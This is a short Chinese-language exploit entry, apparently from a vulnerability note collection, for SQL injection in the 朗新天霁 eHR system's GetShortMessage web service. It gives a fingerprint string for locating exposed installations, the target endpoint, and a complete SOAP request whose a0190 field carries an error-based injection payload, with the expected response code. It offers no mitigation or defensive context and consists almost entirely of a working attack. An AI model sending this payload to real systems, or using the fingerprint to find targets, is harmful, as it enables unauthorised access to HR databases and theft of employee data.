# 朗新天霁ehr-GetShortMessage-sql注入漏洞

朗新天霁ehr-GetShortMessage ｜ SQL注入 ｜ —
- **指纹**：`body="ClientBin/MainProgram.xap"`
- **请求**：`POST /ws/GetFunc_code.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetShortMessage xmlns="http://tempuri.org/">
<a0190>-7952' and 1=user--+</a0190>
</GetShortMessage>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200